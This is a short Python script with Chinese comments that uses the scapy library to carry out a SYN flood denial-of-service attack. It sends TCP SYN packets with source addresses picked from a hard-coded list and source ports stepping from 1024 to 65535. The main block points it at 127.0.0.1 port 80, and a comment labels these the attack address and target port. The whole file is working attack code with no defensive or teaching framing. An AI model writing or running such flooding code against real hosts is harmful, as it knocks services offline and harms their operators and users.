# coding: utf-8
import random
from scapy.all import *


def synflood(tgt,dPort):
    # 随机ip源列表
    srclist = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']
    # 随机端口源列表
    for sPort in range(1024,65535):
        index = random.randrange(4)
        # 利用ip列表构造IP包
        ipLayer = IP(src=srclist[index], dst=tgt)
        # 利用tcp列表构造TCP包
        tcpLayer = TCP(sport=sPort, dport=dPort, flags="S")
        # 组合包
        packet = ipLayer / tcpLayer
        send(packet)


if __name__ == '__main__':
    # 攻击的IP地址和目标端口
    synflood('127.0.0.1', 80)